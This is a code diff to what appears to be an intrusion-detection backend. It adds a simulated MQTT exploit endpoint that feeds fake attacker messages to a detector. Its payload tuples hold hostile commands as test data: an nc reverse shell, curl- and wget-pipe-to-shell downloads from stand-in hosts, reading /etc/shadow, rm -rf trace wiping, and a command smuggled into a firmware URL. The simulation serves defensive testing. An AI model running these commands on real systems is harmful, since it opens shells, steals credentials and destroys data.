@@ -43,6 +43,13 @@ ATTACK_IP_POOLS: Dict[str, List[str]] = {
         "203.0.113.92",
         "192.0.2.199",
     ],
+    "mqtt-exploit": [
+        "198.51.100.112",
+        "198.51.100.165",
+        "203.0.113.71",
+        "203.0.113.140",
+        "192.0.2.98",
+    ],
 }
 
 EXPLOIT_PAYLOADS: Tuple[str, ...] = (
@@ -51,6 +58,14 @@ EXPLOIT_PAYLOADS: Tuple[str, ...] = (
     "nc -e /bin/sh 192.0.2.55 4444",
     "cat /etc/shadow && rm -rf /tmp/traces",
     "wget http://198.51.100.10/loader.sh -O - | /bin/bash",
+)
+
+MQTT_EXPLOIT_PAYLOADS: Tuple[Tuple[str, str], ...] = (
+    ("home/admin/config", '{"cmd": "curl -s http://malicious.payload/botnet.sh | sh", "admin": true}'),
+    ("home/system/firmware_update", '{"firmware_url": "http://198.51.100.10/loader.sh; chmod +x /tmp/loader"}'),
+    ("home/debug/shell", '{"exec": "/bin/sh -c rm -rf /tmp/traces"}'),
+    ("home/gateway/exec", '{"payload": "nc -e /bin/sh 192.0.2.55 4444"}'),
+    ("home/admin/credentials", '{"action": "dump_users", "format": "cat /etc/shadow"}'),
 )
 
 
@@ -529,6 +544,55 @@ async def trigger_simulated_port_sweep(
     return make_response(
         data=data,
         message=f"Reconnaissance sweep simulation ({mode}) completed for {', '.join(target_ips)}.",
+    )
+
+
+@router.post("/simulate/attack/mqtt-exploit")
+async def trigger_simulated_mqtt_exploit(
+    request: Request,
+    payload: Optional[AttackSimulationRequest] = Body(default=None),
+) -> Dict[str, Any]:
+    """Triggers an MQTT honey-topic breach and payload injection exploit simulation."""
+    _ensure_simulated_mode(request)
+    detector = get_detector(request)
+    broadcaster = get_broadcaster(request)
+    target_ips, mode = _resolve_simulation_targets("mqtt-exploit", payload)
+    pre_banned = {ip for ip in target_ips if detector.firewall.is_ip_banned(ip)}
+    exploits_used: List[str] = []
+
+    for idx, attacker_ip in enumerate(target_ips):
+        topic, mqtt_payload = MQTT_EXPLOIT_PAYLOADS[idx % len(MQTT_EXPLOIT_PAYLOADS)]
+        exploits_used.append(f"{topic}: {mqtt_payload[:50]}")
+        # Broadcast synthetic MQTT threat frame
+        await broadcaster.broadcast("iot_telemetry", {
+            "topic": topic,
+            "payload": mqtt_payload,
+            "timestamp": time.time(),
+            "device_id": f"rogue_{attacker_ip.replace('.', '_')}",
+            "device_name": f"Adversary Node ({attacker_ip})",
+            "mode": "simulated",
+            "threat": True,
+        })
+        # Evaluate directly in detector
+        detector.evaluate_mqtt_message(
+            topic=topic,
+            payload=mqtt_payload,
+            src_ip=attacker_ip,
+        )
+        if len(target_ips) > 1:
+            await asyncio.sleep(0.03)
+
+    data = _build_simulation_result(
+        detector,
+        target_ips,
+        mode,
+        len(target_ips),
+        pre_banned,
+        extra={"exploit": exploits_used[0]},
+    )
+    return make_response(
+        data=data,
+        message=f"MQTT honey-topic exploit simulation ({mode}) completed for {', '.join(target_ips)}.",
     )
 
 
